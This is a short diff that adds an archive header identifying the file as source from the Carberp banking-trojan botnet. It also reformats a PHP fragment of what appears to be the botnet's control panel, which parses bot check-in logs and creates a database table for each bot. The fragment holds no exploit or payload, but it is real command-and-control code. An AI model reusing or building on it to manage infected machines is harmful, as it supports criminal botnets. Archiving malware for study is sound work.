@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);
@@ -9,7 +20,9 @@ unset($log);
 
 
 if(isset($match[0])){
-	foreach($match as $item){		if(!file_exists('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp)){			$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$hp.' LIKE adm_unnecessary.bf_unnecessary');
+	foreach($match as $item){
+		if(!file_exists('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp)){
+			$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$hp.' LIKE adm_unnecessary.bf_unnecessary');
 			file_put_contents('/srv/www/vhosts/adm.piqa.in/cache/unnecessary/' . $hp, true);
 		}
 
